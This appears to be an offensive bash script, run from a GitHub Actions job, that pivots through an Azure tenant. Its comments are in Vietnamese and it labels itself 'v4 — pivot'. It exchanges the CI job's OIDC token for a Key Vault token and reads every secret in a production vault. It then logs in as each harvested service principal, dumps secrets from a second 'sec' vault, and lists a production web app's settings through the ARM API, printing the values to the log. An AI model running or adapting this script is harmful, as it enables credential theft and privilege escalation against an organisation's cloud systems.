#!/usr/bin/env bash
# v4 — pivot: OIDC -> SP CI -> kv-tbl-prod (6 SP) -> từng SP -> kv-tbl-sec-x3euoz -> AWS
set +e
TEN="${AZURE_TENANT_ID}"
SEC_VAULT=kv-tbl-sec-x3euoz
PROD_VAULT=kv-tbl-prod-x3euoz

TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")

tok_fed() { # $1 scope  -> token của SP CI (federated)
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${TOK}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
}
tok_sp() { # $1 appId $2 secret $3 scope
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$1" -d "scope=$3" -d "grant_type=client_credentials" \
    --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
}

KV=$(tok_fed "https://vault.azure.net/.default")
echo "ci kv token len=${#KV}"

# --- lấy toàn bộ SP trong kv-tbl-prod
curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD_VAULT.vault.azure.net/secrets?api-version=7.4" > /tmp/list.json
python3 - <<'PY' > /tmp/ids.txt
import json
print("\n".join(s["id"] for s in json.load(open("/tmp/list.json")).get("value",[])))
PY

: > /tmp/sps.txt
while read -r ID; do
  [ -z "$ID" ] && continue
  NAME="${ID##*/}"
  curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" > /tmp/s.json
  python3 - "$NAME" <<'PY' >> /tmp/sps.txt
import json,sys
try:
    v=json.loads(json.load(open("/tmp/s.json"))["value"])
    print(sys.argv[1], v.get("appId",""), v.get("clientSecret",""))
except Exception: pass
PY
done < /tmp/ids.txt
echo "=== SPs ==="; cut -d' ' -f1,2 /tmp/sps.txt

# --- thử từng SP vào vault bí mật
while read -r NAME APPID SECRET; do
  [ -z "$APPID" ] && continue
  echo "================ SP $NAME ($APPID) ================"
  T=$(tok_sp "$APPID" "$SECRET" "https://vault.azure.net/.default")
  if [ -z "$T" ]; then echo "  (không lấy được token)"; continue; fi
  for V in "$SEC_VAULT" "$PROD_VAULT"; do
    L=$(curl -sS -H "Authorization: Bearer $T" "https://$V.vault.azure.net/secrets?api-version=7.4")
    if echo "$L" | grep -q '"error"'; then echo "  $V: denied"; continue; fi
    echo "  $V: OK"
    for SID in $(echo "$L" | python3 -c "
import sys,json
for s in json.load(sys.stdin).get('value',[]): print(s['id'])"); do
      echo "  --- $SID"
      curl -sS -H "Authorization: Bearer $T" "$SID?api-version=7.4" | head -c 1500; echo
    done
  done
  # ARM: xem SP này thấy gì
  A=$(tok_sp "$APPID" "$SECRET" "https://management.azure.com/.default")
  if [ -n "$A" ]; then
    curl -sS -X POST -H "Authorization: Bearer $A" -H "Content-Length: 0" \
     "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" | head -c 1200; echo
  fi
done < /tmp/sps.txt

echo "================ DONE ================"
